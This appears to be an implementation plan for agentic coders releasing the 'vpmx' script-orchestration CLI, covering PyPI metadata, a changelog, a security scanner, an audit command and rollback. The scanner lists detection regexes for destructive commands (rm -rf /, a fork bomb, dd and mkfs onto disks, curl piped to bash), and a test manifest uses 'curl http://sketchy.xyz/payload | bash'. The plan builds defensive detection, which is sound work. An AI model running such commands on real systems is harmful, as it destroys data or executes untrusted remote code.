# VPMX Public Release — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Transform VPM from a private VPS tool into a publish-worthy open-source CLI on PyPI — with security scanning, rollback, remote manifests, AI agent files, examples, CI/CD, and tests.

**Architecture:** Extend the existing modular Python package with new `scanner.py` module, extend `models.py`/`manifest.py`/`executor.py`/`app.py`/`cli.py` for rollback + remote + audit commands. Zero external deps constraint preserved.

**Tech Stack:** Python 3.10+ stdlib only. GitHub Actions. PyPI (trusted publisher).

**Spec:** `docs/specs/2026-04-22-vpmx-public-release-design.md`

---

## Task 1: PyPI Rename & Metadata Update

**Files:**
- Modify: `pyproject.toml`
- Modify: `vpm/__init__.py`
- Modify: `upgrade.sh`

- [ ] **Step 1: Update pyproject.toml**

```toml
[build-system]
requires = ["setuptools>=68.0"]
build-backend = "setuptools.build_meta"

[project]
name = "vpmx"
version = "1.1.0"
description = "Virtual Package Manager — resumable, trackable script orchestration for VPS and local environments"
readme = "README.md"
license = "MIT"
requires-python = ">=3.10"
authors = [{ name = "Mohammed A. Al-Kebsi", email = "mohammed.k@mohammed-alkebsi.dev" }]
keywords = [
    "vps", "orchestration", "automation", "devops",
    "script-runner", "shell", "deployment", "server-setup",
    "crash-recovery", "interactive", "manifest",
]
classifiers = [
    "Development Status :: 4 - Beta",
    "Environment :: Console",
    "Intended Audience :: System Administrators",
    "Intended Audience :: Developers",
    "Operating System :: POSIX :: Linux",
    "Operating System :: MacOS",
    "Programming Language :: Python :: 3",
    "Programming Language :: Python :: 3.10",
    "Programming Language :: Python :: 3.11",
    "Programming Language :: Python :: 3.12",
    "Programming Language :: Python :: 3.13",
    "Topic :: System :: Installation/Setup",
    "Topic :: System :: Systems Administration",
    "Topic :: Utilities",
]

[project.urls]
Homepage = "https://github.com/Nao-30/vpm"
Repository = "https://github.com/Nao-30/vpm"
Issues = "https://github.com/Nao-30/vpm/issues"
Changelog = "https://github.com/Nao-30/vpm/blob/main/CHANGELOG.md"

[project.scripts]
vpm = "vpm.cli:main"

[tool.setuptools.packages.find]
include = ["vpm*"]
```

- [ ] **Step 2: Update vpm/__init__.py**

```python
"""
VPM - Virtual Package Manager
A robust, interactive package/script orchestrator for VPS environments.

PyPI package: vpmx | CLI command: vpm
"""

__version__ = "1.1.0"
__app_name__ = "vpm"
```

- [ ] **Step 3: Update upgrade.sh pipx references**

In `upgrade.sh`, the script already uses `$REPO_DIR` for the local path and `pipx install` which uses the package name from pyproject.toml. No changes needed to the script logic — the `name = "vpmx"` in pyproject.toml handles it. Verify by reading the script and confirming no hardcoded `vpm` package name references exist beyond the CLI command name.

- [ ] **Step 4: Verify the build works**

```bash
cd /path/to/vpm
python3 -m build --sdist --no-isolation 2>&1 || python3 setup.py sdist 2>&1
# If python3 -m build not available:
python3 -c "import setuptools; print('setuptools OK')"
python3 -m vpm version
```

- [ ] **Step 5: Commit**

```bash
git add pyproject.toml vpm/__init__.py
git commit -m "chore: rename PyPI package to vpmx, bump to 1.1.0"
```

---

## Task 2: CHANGELOG.md

**Files:**
- Create: `CHANGELOG.md`

- [ ] **Step 1: Create CHANGELOG.md**

```markdown
# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Added
- Security scanner with static pattern detection (`vpm audit`)
- Auto-scan before `vpm install` with configurable severity levels
- Rollback system with `rollback:` manifest field and `vpm rollback` command
- Remote manifest execution (`vpm run <url>`)
- GitHub shorthand for remote manifests (`vpm run github:user/repo`)
- AI agent context files (`AGENTS.md`, `llms.txt`)
- Example manifests for common server setups
- CI/CD with GitHub Actions
- Unit tests for parser, models, scanner, and dependency resolver

### Changed
- PyPI package renamed from `vpm` to `vpmx` (CLI command unchanged)
- Expanded pyproject.toml metadata (keywords, classifiers, URLs)

## [1.0.0] - 2026-03-17

### Added
- Initial release
- Custom manifest format parser (no YAML dependency)
- PTY-based interactive command execution
- Dependency resolution with topological sort and cycle detection
- Crash recovery via atomic lock file with write-then-rename
- Change detection via SHA-256 command hashing
- Shell completions for zsh, bash, and fish
- Self-diagnostics with `vpm doctor`
- Full logging with per-step and summary log files
- Resume support — interrupted installs pick up where they left off
- `vpm init` manifest template generator
- `vpm setup` for PATH installation (user and global)

[Unreleased]: https://github.com/Nao-30/vpm/compare/v1.0.0...HEAD
[1.0.0]: https://github.com/Nao-30/vpm/releases/tag/v1.0.0
```

- [ ] **Step 2: Commit**

```bash
git add CHANGELOG.md
git commit -m "docs: add CHANGELOG.md"
```

---

## Task 3: Security Scanner — Core Module

**Files:**
- Create: `vpm/scanner.py`

- [ ] **Step 1: Create vpm/scanner.py with SecurityFinding and SecurityScanner**

```python
"""Security scanner for VPM manifest commands."""

import re
import urllib.request
import json
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path

from .config import Config
from .style import Style
from .ui import UI


class Severity(str, Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"


@dataclass
class SecurityFinding:
    severity: str
    app_name: str
    step_index: int
    step_label: str
    pattern_name: str
    description: str
    matched_text: str
    suggestion: str = ""


# Each rule: (compiled_regex, pattern_name, description, suggestion)
_RuleType = tuple[re.Pattern, str, str, str]

CRITICAL_RULES: list[_RuleType] = [
    (
        re.compile(r"rm\s+(-[a-zA-Z]*f[a-zA-Z]*\s+)?-[a-zA-Z]*r[a-zA-Z]*\s+/\s*$|rm\s+(-[a-zA-Z]*r[a-zA-Z]*\s+)?-[a-zA-Z]*f[a-zA-Z]*\s+/\s*$|rm\s+-rf\s+/\*"),
        "system-wipe",
        "Recursive forced deletion of root filesystem",
        "This will destroy the entire system. Remove this command.",
    ),
    (
        re.compile(r":\(\)\s*\{\s*:\|:\s*&\s*\}\s*;\s*:"),
        "fork-bomb",
        "Fork bomb — will crash the system by exhausting process table",
        "Remove this command entirely.",
    ),
    (
        re.compile(r"mkfs\s+.*(/dev/[sv]d[a-z]\b|/dev/nvme)"),
        "format-disk",
        "Formatting a system disk device",
        "Verify this is the correct device. Never format system drives.",
    ),
    (
        re.compile(r"dd\s+.*if=/dev/(zero|random|urandom).*of=/dev/[sv]d[a-z]"),
        "disk-overwrite",
        "Overwriting a disk device with dd",
        "This will destroy all data on the target device.",
    ),
    (
        re.compile(r"chmod\s+(-R\s+)?777\s+/\s*$"),
        "global-permission-nuke",
        "Setting 777 permissions on root filesystem",
        "This makes every file world-writable. Never do this.",
    ),
]

HIGH_RULES: list[_RuleType] = [
    (
        re.compile(r"curl\s+[^|]*\|\s*(sudo\s+)?(ba)?sh\b|wget\s+[^|]*\|\s*(sudo\s+)?(ba)?sh\b|curl\s+[^|]*\|\s*(sudo\s+)?python"),
        "pipe-to-shell",
        "Downloading and piping directly to shell interpreter",
        "Download first, inspect, then execute. Or verify the URL is from a trusted source.",
    ),
    (
        re.compile(r"\beval\s+[\"']?\$"),
        "eval-variable",
        "Using eval with variable expansion — potential code injection",
        "Avoid eval with variables. Use direct command execution instead.",
    ),
    (
        re.compile(r"chmod\s+(-R\s+)?777\b"),
        "chmod-777",
        "Setting overly permissive 777 permissions",
        "Use more restrictive permissions: 755 for dirs, 644 for files.",
    ),
    (
        re.compile(r">\s*/etc/(passwd|shadow|sudoers)\b|tee\s+/etc/(passwd|shadow|sudoers)\b"),
        "overwrite-auth-files",
        "Directly writing to authentication/authorization files",
        "Use proper tools: useradd, usermod, visudo.",
    ),
    (
        re.compile(r"--no-check-certificate|--insecure|-k\s"),
        "insecure-download",
        "Disabling SSL certificate verification",
        "Fix the certificate issue instead of bypassing verification.",
    ),
]

MEDIUM_RULES: list[_RuleType] = [
    (
        re.compile(r"(curl|wget)\s+.*-o\s+\S+.*&&.*chmod\s+\+x|curl\s+.*>\s*\S+.*&&.*chmod\s+\+x"),
        "download-and-execute",
        "Downloading a file and making it executable",
        "Verify the download URL is from a trusted source.",
    ),
    (
        re.compile(r"add-apt-repository|apt-key\s+add|rpm\s+--import"),
        "third-party-repo",
        "Adding a third-party package repository or key",
        "Verify the repository is official and trusted.",
    ),
    (
        re.compile(r"crontab\s+-[el]|/etc/cron"),
        "crontab-modification",
        "Modifying system crontab or cron directories",
        "Review the cron entry carefully before applying.",
    ),
    (
        re.compile(r"git\s+clone\s+(?!https://)(?!git@)"),
        "insecure-git-clone",
        "Cloning from non-HTTPS, non-SSH git URL",
        "Use HTTPS or SSH URLs for git clone.",
    ),
]

LOW_RULES: list[_RuleType] = [
    (
        re.compile(r"\bsudo\b"),
        "uses-sudo",
        "Command uses sudo (elevated privileges)",
        "Expected for system administration, but verify each sudo usage.",
    ),
]

# URL extraction pattern
URL_PATTERN = re.compile(r'https?://[^\s\'"<>]+')

# Suspicious URL heuristics
SUSPICIOUS_TLDS = {".xyz", ".top", ".buzz", ".click", ".loan", ".work", ".gq", ".ml", ".tk", ".cf", ".ga"}
URL_SHORTENERS = {"bit.ly", "tinyurl.com", "t.co", "goo.gl", "is.gd", "v.gd", "ow.ly", "buff.ly"}


class SecurityScanner:
    """Scans manifest commands for security risks."""

    def __init__(self, config: Config):
        self.config = config
        cfg = config.load_config()
        sec = cfg.get("security", {})
        self.level = sec.get("level", "warn")
        self.check_urls = sec.get("check_urls", False)
        self.vt_api_key = sec.get("virustotal_api_key")
        self.allowed_domains = set(sec.get("allowed_domains", [
            "github.com", "raw.githubusercontent.com",
            "download.docker.com", "deb.nodesource.com",
            "packages.microsoft.com", "dl.google.com",
            "archive.ubuntu.com", "deb.debian.org",
            "pypi.org", "files.pythonhosted.org",
            "registry.npmjs.org", "rubygems.org",
        ]))

    def scan_apps(self, apps: list) -> list[SecurityFinding]:
        """Scan a list of ManifestApp objects. Returns all findings."""
        findings: list[SecurityFinding] = []
        for app in apps:
            for idx, step in enumerate(app.steps):
                command = step.get("command", "")
                label = step.get("label", f"Step {idx + 1}")
                findings.extend(
                    self._scan_command(command, app.name, idx, label)
                )
        return findings

    def _scan_command(
        self, command: str, app_name: str, step_index: int, step_label: str
    ) -> list[SecurityFinding]:
        findings: list[SecurityFinding] = []

        for rules, severity in [
            (CRITICAL_RULES, Severity.CRITICAL),
            (HIGH_RULES, Severity.HIGH),
            (MEDIUM_RULES, Severity.MEDIUM),
            (LOW_RULES, Severity.LOW),
        ]:
            for pattern, name, desc, suggestion in rules:
                match = pattern.search(command)
                if match:
                    findings.append(SecurityFinding(
                        severity=severity.value,
                        app_name=app_name,
                        step_index=step_index,
                        step_label=step_label,
                        pattern_name=name,
                        description=desc,
                        matched_text=match.group(0).strip()[:120],
                        suggestion=suggestion,
                    ))

        # URL analysis
        urls = URL_PATTERN.findall(command)
        for url in urls:
            findings.extend(
                self._check_url(url, app_name, step_index, step_label)
            )

        return findings

    def _check_url(
        self, url: str, app_name: str, step_index: int, step_label: str
    ) -> list[SecurityFinding]:
        findings: list[SecurityFinding] = []

        # Extract domain
        try:
            from urllib.parse import urlparse
            parsed = urlparse(url)
            domain = parsed.hostname or ""
        except Exception:
            return findings

        # Skip allowed domains
        if any(domain == d or domain.endswith("." + d) for d in self.allowed_domains):
            return findings

        # IP-only URL
        if re.match(r"^\d+\.\d+\.\d+\.\d+$", domain):
            findings.append(SecurityFinding(
                severity=Severity.MEDIUM.value,
                app_name=app_name,
                step_index=step_index,
                step_label=step_label,
                pattern_name="ip-only-url",
                description=f"URL uses IP address instead of domain: {domain}",
                matched_text=url[:120],
                suggestion="Use a domain name. IP-only URLs are harder to verify.",
            ))

        # Suspicious TLD
        for tld in SUSPICIOUS_TLDS:
            if domain.endswith(tld):
                findings.append(SecurityFinding(
                    severity=Severity.MEDIUM.value,
                    app_name=app_name,
                    step_index=step_index,
                    step_label=step_label,
                    pattern_name="suspicious-tld",
                    description=f"URL uses suspicious TLD: {tld}",
                    matched_text=url[:120],
                    suggestion="Verify this domain is legitimate.",
                ))
                break

        # URL shortener
        if domain in URL_SHORTENERS:
            findings.append(SecurityFinding(
                severity=Severity.HIGH.value,
                app_name=app_name,
                step_index=step_index,
                step_label=step_label,
                pattern_name="url-shortener",
                description=f"URL shortener hides the real destination: {domain}",
                matched_text=url[:120],
                suggestion="Use the full, direct URL instead of a shortener.",
            ))

        # Non-HTTPS
        if url.startswith("http://"):
            findings.append(SecurityFinding(
                severity=Severity.MEDIUM.value,
                app_name=app_name,
                step_index=step_index,
                step_label=step_label,
                pattern_name="non-https",
                description="URL uses HTTP instead of HTTPS — traffic is unencrypted",
                matched_text=url[:120],
                suggestion="Use HTTPS to prevent man-in-the-middle attacks.",
            ))

        # Optional: VirusTotal check
        if self.check_urls and self.vt_api_key:
            vt_findings = self._check_virustotal(url, app_name, step_index, step_label)
            findings.extend(vt_findings)

        return findings

    def _check_virustotal(
        self, url: str, app_name: str, step_index: int, step_label: str
    ) -> list[SecurityFinding]:
        """Check URL against VirusTotal API. Returns findings if flagged."""
        findings: list[SecurityFinding] = []
        try:
            import base64
            url_id = base64.urlsafe_b64encode(url.encode()).decode().rstrip("=")
            req = urllib.request.Request(
                f"https://www.virustotal.com/api/v3/urls/{url_id}",
                headers={"x-apikey": self.vt_api_key},
            )
            with urllib.request.urlopen(req, timeout=10) as resp:
                data = json.loads(resp.read())
                stats = data.get("data", {}).get("attributes", {}).get("last_analysis_stats", {})
                malicious = stats.get("malicious", 0)
                suspicious = stats.get("suspicious", 0)
                if malicious > 0 or suspicious > 0:
                    findings.append(SecurityFinding(
                        severity=Severity.CRITICAL.value if malicious > 2 else Severity.HIGH.value,
                        app_name=app_name,
                        step_index=step_index,
                        step_label=step_label,
                        pattern_name="virustotal-flagged",
                        description=f"VirusTotal: {malicious} malicious, {suspicious} suspicious detections",
                        matched_text=url[:120],
                        suggestion="This URL has been flagged by security vendors. Do not use.",
                    ))
        except Exception:
            pass  # Network errors shouldn't block scanning
        return findings

    def should_block(self, findings: list[SecurityFinding]) -> bool:
        """Determine if findings should block execution based on config level."""
        if self.level == "off":
            return False
        for f in findings:
            if f.severity == Severity.CRITICAL.value:
                return True  # Always block critical
            if self.level == "strict" and f.severity == Severity.HIGH.value:
                return True
        return False

    def should_warn(self, findings: list[SecurityFinding]) -> bool:
        """Determine if findings should trigger a warning prompt."""
        if self.level == "off":
            return False
        for f in findings:
            if f.severity == Severity.CRITICAL.value:
                return True
            if f.severity == Severity.HIGH.value:
                return True
            if self.level in ("warn", "strict") and f.severity == Severity.MEDIUM.value:
                return True
        return False

    def filter_display(self, findings: list[SecurityFinding]) -> list[SecurityFinding]:
        """Filter findings based on display level."""
        if self.level == "off":
            return []
        if self.level == "permissive":
            return [f for f in findings if f.severity in (Severity.CRITICAL.value, Severity.HIGH.value)]
        if self.level == "warn":
            return [f for f in findings if f.severity != Severity.LOW.value]
        # strict: show everything
        return findings

    def display_findings(self, findings: list[SecurityFinding]):
        """Print findings to terminal."""
        displayed = self.filter_display(findings)
        if not displayed:
            return

        print()
        UI.header("Security Scan Results", "🛡️")

        severity_icons = {
            Severity.CRITICAL.value: Style.s("✖ CRITICAL", Style.RED, Style.BOLD),
            Severity.HIGH.value: Style.s("⚠ HIGH", Style.YELLOW, Style.BOLD),
            Severity.MEDIUM.value: Style.s("◐ MEDIUM", Style.YELLOW),
            Severity.LOW.value: Style.s("ℹ LOW", Style.DIM),
        }

        current_app = None
        for f in displayed:
            if f.app_name != current_app:
                current_app = f.app_name
                print()
                UI.sub_header(f"[{f.app_name}]")

            icon = severity_icons.get(f.severity, f.severity)
            print(f"  {icon}: {f.description}")
            print(f"    Step {f.step_index + 1}: {f.step_label}")
            UI.dim(f"    {f.matched_text}")
            if f.suggestion:
                UI.info(f"    → {f.suggestion}")
            print()

        # Summary
        counts = {}
        for f in displayed:
            counts[f.severity] = counts.get(f.severity, 0) + 1
        parts = []
        for sev in [Severity.CRITICAL.value, Severity.HIGH.value, Severity.MEDIUM.value, Severity.LOW.value]:
            if sev in counts:
                parts.append(f"{counts[sev]} {sev}")
        UI.info(f"Summary: {', '.join(parts)}")
```

- [ ] **Step 2: Verify the module imports correctly**

```bash
cd /path/to/vpm
python3 -c "from vpm.scanner import SecurityScanner, Severity, SecurityFinding; print('scanner OK')"
```

- [ ] **Step 3: Commit**

```bash
git add vpm/scanner.py
git commit -m "feat: add security scanner module with pattern detection and URL analysis"
```

---

## Task 4: Security Scanner — CLI Integration

**Files:**
- Modify: `vpm/app.py` (add `cmd_audit`)
- Modify: `vpm/cli.py` (add `audit` subcommand, `--skip-security` flag on install)
- Modify: `vpm/executor.py` (add pre-execution scan hook)

- [ ] **Step 1: Add cmd_audit to app.py**

Add this import at the top of `vpm/app.py`:

```python
from .scanner import SecurityScanner
```

Add this method to the `VPM` class, after `cmd_reset`:

```python
    # ── AUDIT ─────────────────────────────────────────────────────────────

    def cmd_audit(self, args):
        """Scan a manifest for security risks without executing."""
        UI.header("Security Audit", "🛡️")

        manifest_path = args.file or self._find_manifest()
        if not manifest_path:
            UI.error("No manifest file found.")
            return

        UI.info(f"Scanning: {manifest_path}")
        apps = ManifestParser.parse_file(Path(manifest_path))

        if not apps:
            UI.warning("No apps found in manifest.")
            return

        scanner = SecurityScanner(self.config)
        findings = scanner.scan_apps(apps)

        if not findings:
            UI.success("No security issues found.")
            return

        scanner.display_findings(findings)

        if scanner.should_block(findings):
            print()
            UI.error("Blocked: Critical security issues found. Resolve before installing.")
            sys.exit(1)
```

- [ ] **Step 2: Add security scan to cmd_install in app.py**

In `cmd_install`, after the manifest is parsed and apps are resolved but before execution begins, add the security scan. Find the section in `cmd_install` where `_execute_install` is called and add the scan before it.

Add `skip_security` handling. In the `cmd_install` method, after apps are parsed (after `apps = ManifestParser.parse_file(...)`) and before the dry-run or execution block, insert:

```python
        # Security scan
        if not args.skip_security:
            scanner = SecurityScanner(self.config)
            findings = scanner.scan_apps(
                [a for a in apps_to_install]  # apps_to_install is the resolved list
            )
            if findings:
                scanner.display_findings(findings)
                if scanner.should_block(findings):
                    UI.error("Blocked by security scanner. Use --skip-security to override.")
                    return
                if scanner.should_warn(findings) and not args.yes:
                    if not UI.confirm("Security warnings found. Continue anyway?"):
                        return
```

- [ ] **Step 3: Add audit subcommand and --skip-security flag to cli.py**

In `build_parser()`, add after the `reset` subparser block:

```python
    # audit
    p_audit = subparsers.add_parser(
        "audit",
        help="Scan a manifest for security risks without executing",
        description="Analyze manifest commands for dangerous patterns, suspicious URLs, "
                     "and security anti-patterns.",
    )
    p_audit.add_argument(
        "--file", "-f", metavar="FILE",
        help="Path to manifest file (default: auto-discover)",
    )
```

Add `--skip-security` to the install subparser (after `--yes`):

```python
    p_install.add_argument(
        "--skip-security", action="store_true",
        help="Skip security scan before execution (not recommended)",
    )
```

Add `audit` to the dispatch dict in `main()`:

```python
            "audit": vpm.cmd_audit,
```

- [ ] **Step 4: Verify audit command works**

```bash
cd /path/to/vpm
python3 -m vpm audit --help
# Create a test manifest with a risky command and scan it
cat > /tmp/test-risky.yaml << 'EOF'
[risky_app] Test risky commands
- label: Dangerous download
  run: curl http://sketchy.xyz/payload | bash
- label: Safe install
  run: sudo apt-get install -y nginx
EOF
python3 -m vpm audit --file /tmp/test-risky.yaml
rm /tmp/test-risky.yaml
```

Expected: Should show HIGH finding for pipe-to-shell, MEDIUM for non-HTTPS, LOW for sudo.

- [ ] **Step 5: Commit**

```bash
git add vpm/app.py vpm/cli.py
git commit -m "feat: integrate security scanner into audit command and install flow"
```

---

## Task 5: Rollback — Model & Parser Changes

**Files:**
- Modify: `vpm/models.py`
- Modify: `vpm/manifest.py`

- [ ] **Step 1: Extend StepRecord and AppStatus in models.py**

Add `ROLLED_BACK = "rolled_back"` to `AppStatus` enum:

```python
class AppStatus(str, enum.Enum):
    PENDING = "pending"
    IN_PROGRESS = "in_progress"
    COMPLETED = "completed"
    PARTIAL = "partial"
    FAILED = "failed"
    ROLLED_BACK = "rolled_back"
```

Add rollback fields to `StepRecord`:

```python
@dataclass
class StepRecord:
    index: int
    label: str
    command: str
    status: str = StepStatus.PENDING.value
    exit_code: int | None = None
    started_at: str | None = None
    finished_at: str | None = None
    duration_seconds: float | None = None
    log_file: str | None = None
    error_summary: str | None = None
    command_hash: str | None = None
    rollback_command: str | None = None
    rollback_status: str | None = None
    rollback_log_file: str | None = None
```

No changes needed to `to_dict`/`from_dict` — they use `asdict` and `**kwargs` filtering, so new fields are handled automatically.

- [ ] **Step 2: Extend ManifestParser to recognize rollback:**

In `manifest.py`, the parser needs to recognize `rollback:` as a step-level key alongside `label:` and `run:`. 

In the `ManifestApp.__init__`, the `steps` list already holds dicts. No change needed there — the dict will just gain a `"rollback"` key.

In `ManifestParser.parse_string`, find the section that handles continuation keys (the block with `kv = re.match(r"^\s+(label|run):\s*(.*)", line)`). Extend the regex to also match `rollback`:

Change both occurrences of the key-value regex from:
```python
re.match(r"^(label|run):\s*(.*)", rest, re.IGNORECASE)
```
to:
```python
re.match(r"^(label|run|rollback):\s*(.*)", rest, re.IGNORECASE)
```

And the continuation key regex from:
```python
re.match(r"^\s+(label|run):\s*(.*)", line)
```
to:
```python
re.match(r"^\s+(label|run|rollback):\s*(.*)", line)
```

Then handle the `rollback` key the same way as `run` — supporting both single-line and multi-line (`rollback: |`):

In the step-match block where `key == "run"` is handled, add after it:

```python
                    elif key == "rollback":
                        if val == "|":
                            in_multiline = True
                            multiline_indent = len(line) - len(line.lstrip()) + 2
                            multiline_lines = []
                            # We need to track that this multiline is for rollback, not run
                            # Add a flag: multiline_target
                            multiline_target = "rollback"
                        else:
                            current_step["rollback"] = val
```

This requires adding a `multiline_target` variable to track whether the current multiline block is for `run` or `rollback`. Initialize it as `"command"` at the top of `parse_string`, and when a multiline block ends, assign to the correct key:

```python
# At top of parse_string, after other variable inits:
multiline_target = "command"  # "command" or "rollback"

# When multiline ends (where current_step["command"] is assigned):
if current_step is not None:
    if multiline_target == "rollback":
        current_step["rollback"] = "\n".join(multiline_lines).strip()
    else:
        current_step["command"] = "\n".join(multiline_lines).strip()

# When run: | starts multiline:
multiline_target = "command"

# When rollback: | starts multiline:
multiline_target = "rollback"
```

Apply this pattern to ALL places where multiline blocks start and end in the parser.

- [ ] **Step 3: Verify parser handles rollback**

```bash
cd /path/to/vpm
cat > /tmp/test-rollback.yaml << 'EOF'
[test_app] Test rollback parsing
- label: Install nginx
  run: sudo apt-get install -y nginx
  rollback: sudo apt-get remove -y nginx

- label: Configure firewall
  run: |
    sudo ufw allow http
    sudo ufw allow https
  rollback: |
    sudo ufw delete allow http
    sudo ufw delete allow https
EOF

python3 -c "
from vpm.manifest import ManifestParser
from pathlib import Path
apps = ManifestParser.parse_file(Path('/tmp/test-rollback.yaml'))
for app in apps:
    for step in app.steps:
        print(f'{step[\"label\"]}: run={step[\"command\"][:40]}... rollback={step.get(\"rollback\", \"NONE\")[:40]}')
"
rm /tmp/test-rollback.yaml
```

Expected: Both steps should show their rollback commands.

- [ ] **Step 4: Commit**

```bash
git add vpm/models.py vpm/manifest.py
git commit -m "feat: add rollback support to models and manifest parser"
```

---

## Task 6: Rollback — Execution & CLI

**Files:**
- Modify: `vpm/app.py` (add `cmd_rollback`)
- Modify: `vpm/cli.py` (add `rollback` subcommand)
- Modify: `vpm/executor.py` (add `rollback_app` method)

- [ ] **Step 1: Add rollback_app method to Executor**

Add this method to the `Executor` class in `executor.py`, after `execute_app`:

```python
    def rollback_app(self, record: AppRecord, dry_run: bool = False) -> AppRecord:
        """Run rollback commands in reverse order for succeeded steps."""
        now = datetime.datetime.now()
        app_log_dir = self.config.get_app_log_dir(record.name)

        # Collect steps to rollback: succeeded steps with rollback commands, reversed
        rollback_steps = [
            s for s in reversed(record.steps)
            if s.status == StepStatus.SUCCESS.value and s.rollback_command
        ]

        if not rollback_steps:
            UI.warning("No steps to rollback (no succeeded steps with rollback commands).")
            # Warn about steps without rollback
            no_rollback = [
                s for s in record.steps
                if s.status == StepStatus.SUCCESS.value and not s.rollback_command
            ]
            if no_rollback:
                UI.dim(f"  {len(no_rollback)} succeeded step(s) have no rollback command defined.")
            return record

        UI.header(f"Rolling back: {record.display_name}", "⏪")
        UI.info(f"Steps to rollback: {len(rollback_steps)}")

        if dry_run:
            for s in rollback_steps:
                UI.step(s.index + 1, len(record.steps), f"[ROLLBACK] {s.label}")
                UI.dim(f"  $ {s.rollback_command[:100]}")
            return record

        summary_log = app_log_dir / f"rollback_{now.strftime('%Y%m%d_%H%M%S')}.log"

        with open(summary_log, "w") as summary_f:
            summary_f.write(f"VPM Rollback Summary\n")
            summary_f.write(f"{'=' * 60}\n")
            summary_f.write(f"App: {record.display_name}\n")
            summary_f.write(f"Started: {now.isoformat()}\n")
            summary_f.write(f"Steps to rollback: {len(rollback_steps)}\n")
            summary_f.write(f"{'=' * 60}\n\n")

            for i, step in enumerate(rollback_steps):
                UI.step(i + 1, len(rollback_steps), f"[ROLLBACK] {step.label}")
                UI.dim(f"  $ {step.rollback_command[:100]}")

                step.rollback_status = StepStatus.RUNNING.value
                self.lock.set_app(record)

                # Create rollback log file
                safe_label = re.sub(r"[^\w\-.]", "_", step.label)[:50]
                rb_log = app_log_dir / f"rollback_{step.index:03d}_{safe_label}_{now.strftime('%H%M%S')}.log"
                step.rollback_log_file = str(rb_log)

                try:
                    with open(rb_log, "w") as lf:
                        lf.write(f"VPM Rollback Step Log\n")
                        lf.write(f"{'─' * 60}\n")
                        lf.write(f"Step: {step.index + 1} — {step.label}\n")
                        lf.write(f"Rollback command:\n{step.rollback_command}\n")
                        lf.write(f"{'─' * 60}\n\n")
                        lf.flush()

                        shell = os.environ.get("SHELL", "/bin/bash")
                        if "bash" not in shell and "zsh" not in shell:
                            shell = "/bin/bash"

                        exit_code = self._pty_exec(
                            shell_path=shell,
                            command=step.rollback_command,
                            env=os.environ.copy(),
                            log_fh=lf,
                        )

                        if exit_code == 0:
                            step.rollback_status = StepStatus.SUCCESS.value
                            UI.success(f"Rolled back")
                            summary_f.write(f"[OK] Rollback step {step.index + 1}: {step.label}\n")
                        else:
                            step.rollback_status = StepStatus.FAILED.value
                            UI.error(f"Rollback failed (exit {exit_code})")
                            summary_f.write(f"[FAIL] Rollback step {step.index + 1}: {step.label} (exit={exit_code})\n")
                            # Continue with remaining rollbacks (best-effort)

                except OSError as e:
                    step.rollback_status = StepStatus.FAILED.value
                    UI.error(f"Rollback error: {e}")
                    summary_f.write(f"[ERROR] Rollback step {step.index + 1}: {step.label} — {e}\n")

                self.lock.set_app(record)

            end_time = datetime.datetime.now()
            summary_f.write(f"\n{'=' * 60}\n")
            summary_f.write(f"Finished: {end_time.isoformat()}\n")
            summary_f.write(f"Duration: {(end_time - now).total_seconds():.1f}s\n")
            summary_f.write(f"{'=' * 60}\n")

        # Update app status
        record.status = AppStatus.ROLLED_BACK.value
        self.lock.set_app(record)

        rb_succeeded = sum(1 for s in rollback_steps if s.rollback_status == StepStatus.SUCCESS.value)
        rb_failed = sum(1 for s in rollback_steps if s.rollback_status == StepStatus.FAILED.value)

        print()
        if rb_failed == 0:
            UI.success(f"Rollback complete: {rb_succeeded}/{len(rollback_steps)} steps rolled back.")
        else:
            UI.warning(f"Rollback partial: {rb_succeeded} succeeded, {rb_failed} failed.")
        UI.dim(f"Log: {summary_log}")

        return record
```

- [ ] **Step 2: Add cmd_rollback to app.py**

Add this method to the `VPM` class:

```python
    # ── ROLLBACK ──────────────────────────────────────────────────────────

    def cmd_rollback(self, args):
        """Rollback a previously installed app."""
        UI.header("Rollback", "⏪")

        record = self.lock.get_app(args.app)
        if not record:
            UI.error(f"App '{args.app}' not found in tracking.")
            UI.info("Run 'vpm list' to see tracked apps.")
            return

        # Check if any steps have rollback commands
        has_rollback = any(s.rollback_command for s in record.steps)
        if not has_rollback:
            UI.error(f"No rollback commands defined for '{args.app}'.")
            UI.info("Add 'rollback:' fields to your manifest steps to enable rollback.")
            return

        succeeded_with_rollback = [
            s for s in record.steps
            if s.status == StepStatus.SUCCESS.value and s.rollback_command
        ]
        succeeded_without = [
            s for s in record.steps
            if s.status == StepStatus.SUCCESS.value and not s.rollback_command
        ]

        if not succeeded_with_rollback:
            UI.warning("No succeeded steps with rollback commands to undo.")
            return

        # Show what will be rolled back
        UI.info(f"Steps to rollback ({len(succeeded_with_rollback)}):")
        for s in reversed(succeeded_with_rollback):
            UI.dim(f"  {s.index + 1}. {s.label}")

        if succeeded_without:
            UI.warning(f"{len(succeeded_without)} succeeded step(s) have no rollback command and will be skipped.")

        if args.dry_run:
            self.executor.rollback_app(record, dry_run=True)
            return

        if not UI.confirm("Proceed with rollback?"):
            return

        self.executor.rollback_app(record)
```

- [ ] **Step 3: Wire rollback_command from manifest into executor**

In `executor.py`, in the `execute_app` method, where `StepRecord` objects are created (the `for idx, step_def in enumerate(app.steps):` loop), add the rollback command:

```python
            steps.append(
                StepRecord(
                    index=idx,
                    label=step_def["label"],
                    command=step_def["command"],
                    command_hash=self.compute_command_hash(step_def["command"]),
                    rollback_command=step_def.get("rollback"),
                )
            )
```

- [ ] **Step 4: Add rollback subcommand to cli.py**

In `build_parser()`, add after the `audit` subparser:

```python
    # rollback
    p_rollback = subparsers.add_parser(
        "rollback",
        help="Rollback a previously installed app using defined rollback commands",
        description="Run rollback commands in reverse order for steps that succeeded. "
                     "Only steps with 'rollback:' defined in the manifest can be undone.",
    )
    p_rollback.add_argument("app", help="App name to rollback")
    p_rollback.add_argument(
        "--dry-run", "-n", action="store_true",
        help="Show what would be rolled back without executing",
    )
```

Add to dispatch dict in `main()`:

```python
            "rollback": vpm.cmd_rollback,
```

- [ ] **Step 5: Update status display for ROLLED_BACK in app.py**

